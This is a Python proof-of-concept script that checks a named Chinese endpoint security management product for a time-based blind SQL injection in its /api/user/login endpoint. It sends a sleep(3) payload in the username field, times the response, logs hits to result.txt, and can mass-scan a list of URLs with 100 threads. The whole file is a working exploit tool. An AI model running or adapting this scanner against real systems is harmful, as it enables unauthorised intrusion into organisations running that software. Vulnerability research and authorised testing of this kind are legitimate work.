import argparse,sys,requests
import time
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()  #校验证书错误时防止报错

# 指纹模板
def banner():
    test = """
      .---.       ,-----.      .-_'''-.  .-./`) ,---.   .--.                   .-'''-.     ,-----.      .---.      
  | ,_|     .'  .-,  '.   '_( )_   \ \ .-.')|    \  |  |                  / _     \  .'  .-,  '.    | ,_|      
,-./  )    / ,-.|  \ _ \ |(_ o _)|  '/ `-' \|  ,  \ |  |                 (`' )/`--' / ,-.|  \ _ \ ,-./  )      
\  '_ '`) ;  \  '_ /  | :. (_,_)/___| `-'`"`|  |\_ \|  |                (_ o _).   ;  \  '_ /  | :\  '_ '`)    
 > (_)  ) |  _`,/ \ _/  ||  |  .-----..---. |  _( )_\  |                 (_,_). '. |  _`,/ \ _/  | > (_)  )    
(  .  .-' : (  '\_/ \   ;'  \  '-   .'|   | | (_ o _)  |   _ _     _ _  .---.  \  :: (  '\_/ \   ;(  .  .-'    
 `-'`-'|___\ `"/  \  ) /  \  `-'`   | |   | |  (_,_)\  |--( ' )---(_I_)-\    `-'  | \ `"/  \  )  \ `-'`-'|___  
  |        \'. \_/``".'    \        / |   | |  |    |  | (_{;}_) (_(=)_) \       /   '. \_/``"/)  ) |        \ 
  `--------`  '-----'       `'-...-'  '---' '--'    '--'--(_,_)---(_I_)-  `-...-'      '-----' `-'  `--------` 
                                                                             @author: 赵卿                                       
    """
    print(test)

# 检测模板
def poc(target):
    url = target + "/api/user/login"
    headers = {
        "User-Agent": "Mozilla/5.0(Windows NT 10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/119.0.0.0Safari/537.36Edg/119.0.0.0",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = {
        "captcha":"",
        "password":"21232f297a57a5a743894a0e4a801fc3",
        "username":"wwwww'and(select*from(select+sleep(3))a)='"
    }
    try:
        start_time = time.time()
        # print(start_time)
        requests.post(url=url,headers=headers,data=data,verify=False,timeout=5)
        execution_time = time.time() - start_time
        # print(execution_time)
        # time = res.elapsed.total_seconds()
        # print(time)
        if execution_time > 3:
            print(f"[+] {target} 存在辰信景云终端安全管理系统SQL注入漏洞")
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(target + "存在辰信景云终端安全管理系统SQL注入漏洞\n")
        else:
            print(f"[-] {target} 不存在辰信景云终端安全管理系统SQL注入漏洞")
    except Exception as e:
        print(e)


# 主函数模块
def main():
    banner()
    """命令行接收参数"""
    parser = argparse.ArgumentParser(description='辰信景云终端安全管理系统SQL注入漏洞')
    # -u 单个检测  -f 多行检测
    parser.add_argument('-u', '--url', dest='url', type=str, help='输入URL')
    parser.add_argument('-f', '--file', dest='file', type=str, help='输入文件夹')
    # 调用
    args = parser.parse_args()
    # 处理命令行参数
    # 循环判断
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usaq:\n\t python3 {sys.argv[0]} -h")




# 主函数入口
if __name__ == '__main__':
    main()